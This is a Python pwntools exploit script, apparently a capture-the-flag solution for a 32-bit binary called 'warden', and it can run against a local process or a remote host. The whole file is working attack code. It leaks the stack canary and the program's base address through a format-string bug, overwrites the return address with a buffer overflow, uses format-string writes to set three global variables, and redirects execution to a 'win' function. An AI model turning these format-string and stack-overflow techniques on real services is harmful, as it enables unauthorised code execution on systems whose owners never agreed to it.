#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./warden', checksec=False)
context.clear(arch='i386', os='linux')
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p


p = setup()
p.sendline(f"Canary:%{15}$p ELF:%{17}$p".encode())
p.recvuntil(b'Canary:')
canary = int(p.recv(10), 16)
p.recvuntil(b'ELF:')
elf.address = int(p.recv(10), 16) - 0x3fb0

log.info(f"Canary: {hex(canary)}")
log.info(f"ELF base: {hex(elf.address)}")

p.sendline(b'A' * 32 + p32(canary) + b'\x00' * 12 + p32(elf.symbols.main))

writes = {
    elf.sym.jinx: 0x1337,
    elf.sym.mf:   0x420,
    elf.sym.trex: 0xdeadbeef
}

payload = fmtstr_payload(7, writes, write_size="short")

p.sendline(payload)
p.sendline(b'A' * 32 + p32(canary) + b'\x00' * 12 + p32(elf.symbols.win) + p32(elf.symbols.main) + p32(0x123))
p.interactive()
